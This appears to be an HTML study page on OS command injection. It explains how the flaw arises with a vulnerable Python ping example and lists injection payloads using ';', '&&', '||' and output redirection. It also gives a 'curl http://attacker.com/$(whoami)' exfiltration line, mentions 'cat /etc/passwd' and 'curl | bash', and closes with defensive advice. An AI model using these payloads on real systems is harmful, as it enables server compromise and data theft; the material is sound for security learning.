@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>OS Command Injection</title>
+  <link rel="stylesheet" href="https://myfirstorlastname.github.io/whoami/style.css" />
+</head>
+<body>
+  <div id="toc-container"></div>
+  
+  <h1>🖥️ OS Command Injection</h1>
+  <blockquote>"When applications pass your words to the shell, you decide the next command."</blockquote>
+  <hr>
+
+  <h2>🧠 About</h2>
+  <p>
+    OS Command Injection is a high-impact vulnerability that allows attackers to execute arbitrary system commands
+    on the underlying server. Unlike SQL Injection (which targets databases), command injection interacts directly with the operating system,
+    often leading to full server compromise.
+  </p>
+
+  <h2>⚙️ How OS Command Injection Happens</h2>
+  <p>
+    When user input is concatenated into a system call without sanitization, attackers can inject malicious payloads.  
+    Example vulnerable code:
+  </p>
+  <pre><code class="language-python">import os
+ip = input("Enter IP:")
+os.system("ping -c 1 " + ip)</code></pre>
+
+  <p>
+    If the user enters:
+  </p>
+  <pre><code>127.0.0.1; whoami</code></pre>
+  <p>
+    The executed command becomes:
+  </p>
+  <pre><code>ping -c 1 127.0.0.1; whoami</code></pre>
+  <p>
+    The second command <code>whoami</code> is executed by the server, leaking sensitive information.
+  </p>
+
+  <h2>🧨 Types of OS Command Injection</h2>
+  <table>
+    <thead>
+      <tr><th>Type</th><th>Description</th></tr>
+    </thead>
+    <tbody>
+      <tr><td>Direct Output</td><td>Injected command output is displayed in the response.</td></tr>
+      <tr><td>Blind (Time-based)</td><td>Use delays (<code>sleep</code>) to confirm execution.</td></tr>
+      <tr><td>Blind (File redirection)</td><td>Redirect output into accessible files (<code>&gt; /var/www/html/out.txt</code>).</td></tr>
+      <tr><td>Blind (OAST)</td><td>Exfiltrate via external DNS/HTTP requests (<code>nslookup</code>, <code>curl</code>).</td></tr>
+    </tbody>
+  </table>
+
+  <div class="takeaway-box">
+    <h3>🧠 Key Takeaways</h3>
+    <ul>
+      <li>Command Injection = direct path from input to OS execution.</li>
+      <li>Even when no output is returned, time delays or OAST techniques reveal injection.</li>
+      <li>Danger: It usually results in full RCE, privilege escalation, and pivoting.</li>
+    </ul>
+  </div>
+
+  <h2>🧪 Practical Examples</h2>
+
+  <h3>1) Simple Command Injection</h3>
+  <p>Testing with input:</p>
+  <pre><code>127.0.0.1 && id</code></pre>
+  <p>Executes <code>ping</code> followed by <code>id</code>, returning the process user.</p>
+
+  <h3>2) Blind Injection with Time Delays</h3>
+  <p>Payload:</p>
+  <pre><code>127.0.0.1 || sleep 5</code></pre>
+  <p>Response delay confirms vulnerability, even without visible output.</p>
+
+  <h3>3) Blind Injection with Output Redirection</h3>
+  <p>Payload:</p>
+  <pre><code>127.0.0.1; whoami > /var/www/html/out.txt</code></pre>
+  <p>Attacker retrieves <code>out.txt</code> to view results.</p>
+
+  <h3>4) Out-of-Band Exfiltration</h3>
+  <p>Payload:</p>
+  <pre><code>127.0.0.1; curl http://attacker.com/$(whoami)</code></pre>
+  <p>Data exfiltrated to an attacker-controlled server.</p>
+
+  <h2>🧬 OS Command Injection in Attack Chains</h2>
+  <p>
+    Command injection is rarely the end goal—it’s often a pivot point to deeper compromise.
+  </p>
+  <ul>
+    <li>Read sensitive files (<code>cat /etc/passwd</code>, config files, API keys).</li>
+    <li>Download malware or reverse shells (<code>curl | bash</code>).</li>
+    <li>Move laterally into internal networks using <code>ping</code>, <code>curl</code>, <code>nc</code>.</li>
+    <li>Escalate privileges via kernel exploits or credential reuse.</li>
+  </ul>
+
+  <h2>🛡️ Defense Mindset</h2>
+  <ul>
+    <li>Never concatenate user input into OS commands.</li>
+    <li>Use safe APIs that separate arguments (<code>subprocess.run(["ping", "-c", "1", ip])</code>).</li>
+    <li>Apply strict input validation (allowlists for expected patterns like IPs/domains).</li>
+    <li>Apply least privilege: web apps should not run as root.</li>
+    <li>Use WAF signatures to detect common command separators.</li>
+  </ul>
+
+  <h2>🧰 Tools & Tips</h2>
+  <ul>
+    <li><code>commix</code>: automated OS command injection exploitation tool.</li>
+    <li>Burp Suite Repeater for testing different separators (<code>;</code>, <code>&&</code>, <code>|</code>).</li>
+    <li>OAST services like <code>Burp Collaborator</code> or <code>Interactsh</code> for blind cases.</li>
+    <li>Check all inputs: GET, POST, cookies, headers (User-Agent, Referer, X-Forwarded-For).</li>
+  </ul>
+
+  <div class="takeaway-box">
+    <h3>🛠️ Key Mindset</h3>
+    <ul>
+      <li>Think like the OS: what command does the application actually run?</li>
+      <li>Even error messages and delays are evidence of execution.</li>
+      <li>From ping injection to reverse shells, escalation is a matter of chaining.</li>
+    </ul>
+  </div>
+
+  <hr />
+  <footer>
+    OS Command Injection is one of the fastest paths from web vulnerability to full system compromise.  
+    A single unsanitized input can hand over the server.
+  </footer>
+  <script src="https://myfirstorlastname.github.io/whoami/call_for_toc.js"></script>
+</body>
+</html>
